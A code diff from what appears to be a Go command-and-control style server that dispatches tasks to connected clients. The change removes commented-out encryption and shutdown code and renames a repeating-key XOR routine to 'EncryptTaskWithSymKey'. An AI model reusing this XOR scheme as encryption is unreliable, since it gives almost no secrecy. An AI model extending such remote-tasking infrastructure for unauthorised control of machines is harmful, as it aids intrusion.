@@ -118,14 +118,6 @@ func ServerHandleTask(message []byte) bool {
 			return false
 		}
 		// encrypt task before sending.
-		/*
-			encryptedData, err := EncryptMessageWithSymKey(t.ToBytes(), []byte(ServerSharedSecret))
-			data.MessageData = encryptedData
-			if err != nil {
-				log.Log.Error().Msg("Failed to encrypt task before sending to client")
-				return false
-			}
-		*/
 		ok = db.ClientsDatabase.SendTask(t.ClientId, data.ToBytes())
 		if !ok {
 			log.Log.Error().Msg("Failed to send task to client")
@@ -358,39 +350,10 @@ func DecryptClientPayload(data []byte, clientId string) ([]byte, error) {
 	return decryptedBytes, nil
 }
 
-func EncryptMessageWithSymKey(data []byte, key []byte) ([]byte, error) {
+func EncryptTaskWithSymKey(data []byte, key []byte) []byte {
 	var output []byte
 	for i := 0; i < len(data); i++ {
 		output = append(output, data[i]^key[i%len(key)])
 	}
-	return output, nil
+	return output
 }
-
-/*
-
-	encryptedBlock, err := rsa.EncryptOAEP(
-		sha256.New(),
-		rand.Reader,
-		c.RsaPublicKey,
-		data[start:finish],
-		nil)
-
-*/
-
-/*
-func ServerShutDownAllConnections() {
-	for key, _ := range db.ClientsDatabase.Database {
-		exitMessage := data.Message{
-			MessageType: "Exit",
-			MessageData: data.NewExit(0).ToBytes(),
-		}
-		ok := db.ClientsDatabase.SendMessage(key, exitMessage.ToBytes())
-		if !ok {
-			time.Sleep(time.Second * 5)
-			log.Log.Debug().Msgf("Removing %s Client From List\n", key)
-			db.ClientsDatabase.DeleteConnection(key)
-			db.ClientsDatabase.UpdateClientOnline(key, false)
-		}
-	}
-}
-*/
